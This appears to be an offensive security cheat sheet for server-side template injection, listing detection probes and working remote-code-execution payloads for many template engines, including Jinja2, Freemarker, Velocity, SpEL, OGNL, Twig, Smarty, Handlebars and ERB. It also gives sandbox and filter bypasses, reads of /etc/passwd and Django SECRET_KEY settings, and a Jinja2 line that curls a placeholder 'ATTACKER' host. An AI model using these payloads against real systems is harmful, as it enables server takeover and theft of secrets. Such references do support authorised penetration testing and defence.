# SSTI Reference — Server-Side Template Injection

## Detection Polyglot
```
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

## Detection by Engine
| Payload | Engine |
|---------|--------|
| `{{7*7}}` → 49 | Jinja2, Twig |
| `${7*7}` → 49 | Freemarker, Thymeleaf |
| `<%= 7*7 %>` → 49 | ERB (Ruby) |
| `#{7*7}` → 49 | Ruby string interpolation |
| `{{7*'7'}}` → 7777777 | Jinja2 |
| `{{7*'7'}}` → 49 | Twig |

---

## Python

### Jinja2

**Basic RCE:**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{''.__class__.__base__.__subclasses__()[140].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
```

**MRO chain to RCE:**
```python
# Find index of subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()}}
# Then use the index
{{''.__class__.__mro__[1].__subclasses__()[POPEN_INDEX]('id',shell=True,stdout=-1).communicate()}}
```

**Blind SSTI (DNS):**
```python
{{config.__class__.__init__.__globals__['os'].popen('curl http://ATTACKER').read()}}
```

**Filter bypass (attr()):**
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
```

**Without underscores/brackets:**
```python
{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")()}}
```

### Django
```python
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{% debug %}
```

### Mako
```python
${__import__('os').system('id')}
<%
import os
x=os.popen('id').read()
%>${x}
```

### Tornado
```python
{% import os %}{{os.system('id')}}
```

---

## Java

### Detection
```
${7*7}
#{7*7}
*{7*7}
${"freemarker.template.Configuration".class.forName("freemarker.template.Configuration")}
```

### Freemarker
```java
// RCE via Execute class
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}

// Obfuscated (no special chars)
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(owc)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}

// Sandbox bypass
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>
${ value("java.lang.ProcessBuilder",["id"])["class"].getDeclaredMethods()[0].invoke(value("java.lang.ProcessBuilder",["id"]).start(),null)}
```

### Velocity
```java
// Basic RCE
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())

// Base64 encoded command
#set($runtime=$class.inspect("java.lang.Runtime").type.getRuntime())
#set($process=$runtime.exec(["bash","-c","id"]))
```

### Freemarker (lower_abc obfuscation)
```java
<#assign classStr="freemarker.template.utility.Execute"?new()>${ classStr("id")}
```

### Pebble
```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null) %}
{% set exec = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id') %}
{% set bytes = exec.inputStream.readAllBytes() %}
{{ bytes }}

// Alternative
{%set a=1|abs|class|forName("java.lang.Runtime")|invoke("exec",["id"])|inputStream.readAllBytes()%}
```

### Spring EL (SpEL)
```java
// Basic
${T(java.lang.Runtime).getRuntime().exec('id')}
// ProcessBuilder
${new java.lang.ProcessBuilder({"id"}).start()}
// Boolean-based
${T(java.lang.Runtime).getRuntime().exec('id').waitFor() == 0}
// Error-based
${T(java.lang.Runtime).getRuntime().exec('id').text}
```

### OGNL (Struts2)
```java
%{(#a=@org.apache.struts2.dispatcher.HttpParameters@create(#parameters).withEntry("cmd","id")).exec()}
%{@java.lang.Runtime@getRuntime().exec("id")}
// Chain
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### Groovy
```java
// Basic
${"id".execute().text}
${"id".execute().in.text}
// Sandbox bypass (ASTTest)
@groovy.transform.ASTTest(value={assert "id".execute().text})
class A{}
```

### Jinjava
```java
{{config}}
{{''.__class__.__mro__}}
{{''.class.mro()[1].subclasses()}}
```

---

## PHP

### Twig
```php
// Basic
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Via filter
{{["id"]|filter("system")}}
{{["id",1]|sort("system")|join}}
{{["id"]|map("system")|join}}

// Via reduce
{{[1,2]|reduce("system","id")}}

// Error-based (boolean-based)
{{'/etc/passwd'|file_excerpt(1,30)}}

// CVE-2022-23614 sandbox bypass
{{['id']|map|join}}
```

### Smarty
```php
// Basic
{$smarty.version}
{php}echo `id`;{/php}
// Cat modifier obfuscation
{system('id')}
{['id']|@system}
{'id'|system}
```

### Blade (Laravel)
```php
// Via PHP
{{system('id')}}
@php system('id') @endphp

// Obfuscated
{{implode(chr(7*16).chr(9*12).chr(7*16+1).chr(2*8+4).chr(99),[chr(105).chr(100)])}}
```

### Latte
```php
{php system('id')}
```

---

## JavaScript / Node.js

### Handlebars
```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Lodash (template)
```javascript
// Command execution
_.template('{{= _.escape(require("child_process").execSync("id").toString()) }}')()
```

### Pug
```javascript
= global.process.mainModule.require('child_process').execSync('id').toString()
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x
```

### Universal Node.js
```javascript
require('child_process').execSync('id').toString()
process.mainModule.require('child_process').execSync('id').toString()
```

---

## Ruby

### ERB / Erubi / Erubis
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines() %>
<%- require 'open3' -%><% stdout, stderr, status = Open3.capture3('id') %><%= stdout %>
<%= File.open('/etc/passwd').read %>
```

### HAML
```ruby
= system("id")
= `id`
- require 'open3'
- stdout, stderr, status = Open3.capture3('id')
= stdout
```

### Slim
```ruby
= system("id")
= `id`
```

---

## ASP.NET Razor
```csharp
// Basic detection
@(1+2)

// RCE
@{
    var x = System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
}

// Via System.Runtime
@System.IO.File.ReadAllText("C:\\Windows\\system32\\drivers\\etc\\hosts")
```

---

## SSTI Tools
- `tplmap`: `python tplmap.py -u 'http://target/?name=test'`
- `sstimap`: `python sstimap.py -u 'http://target/?name=test' --legacy`
